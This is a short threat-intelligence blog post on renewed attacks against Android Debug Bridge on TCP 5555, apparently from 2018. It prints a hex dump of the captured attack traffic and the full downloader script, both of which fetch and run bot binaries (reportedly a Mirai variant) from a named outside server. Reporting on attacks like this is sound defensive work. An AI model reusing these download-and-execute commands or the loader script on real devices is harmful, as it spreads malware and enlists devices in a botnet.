---
title: "ADB Shell Attacks"
#author: "Author Name"
description: "Fresh attacks against TCP 5555, a few days after the last ones died out."
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-07-16T00:00:00-00:00
draft: false
---

On 10 July some [new reports](https://telekomsecurity.github.io/2018/07/adb-botnet.html) of fresh attacks against TCP 5555 came out.  These attacks died out quickly as the download server died out.  Telekom Security reported the abuse to the cloud service provider, temporarily halting infections.

Now, it's back!  New download site, new download site, same attack.

```xxd
434e584e000000010010000007000000 CNXN............
32020000bcb1a7b1686f73743a3a004f 2.......host::.O
50454e5802000000000000f200000017 PENX............
4a0000b0afbab17368656c6c3a3e2f73 J......shell:>/s
64636172642f446f776e6c6f61642f66 dcard/Download/f
202626206364202f7364636172642f44  && cd /sdcard/D
6f776e6c6f61642f3b203e2f6465762f ownload/; >/dev/
66202626206364202f6465762f3b203e f && cd /dev/; >
2f646174612f6c6f63616c2f746d702f /data/local/tmp/
66202626206364202f646174612f6c6f f && cd /data/lo
63616c2f746d702f3b2062757379626f cal/tmp/; busybo
78207767657420687474703a2f2f3138 x wget hxxp://18
352e36322e3138392e3134392f616462 5.62.189.149/adb
73202d4f202d3e20616462733b207368 s -O -> adbs; sh
20616462733b206375726c2068747470  adbs; curl hxxp
3a2f2f3138352e36322e3138392e3134 ://185.62.189.14
392f6164627332203e2061646273323b 9/adbs2 > adbs2;
2073682061646273323b20726d206164  sh adbs2; rm ad
627320616462733200               bs adbs2.
```

About 111 unique IPs sent the above data to TCP 5555, showing that in a short time this inspection has become widespread.

The initial script downloaded is nearly the same as what Telekom Security found:

```bash
#!/bin/sh

n="arm7.bot.le i686.bot.le mips.bot.be mipsel.bot.le"
#n="arm.bot.le arm4.bot.le arm7.bot.le mips.bot.be mipsel.bot.le i686.bot.le i586.bot.le x86_64.bot.le"
http_server="185.62.189.149"

for a in $n
do
    cp /system/bin/sh .f
    >.f
    curl http://$http_server/adbb/$a > .f
    chmod 777 .f
    ./.f yItDitb2HvayJvNc
done

for a in $n
do
    rm $a
done
```

Virus Total is fairly certain the binaries are a variant of Mirai.
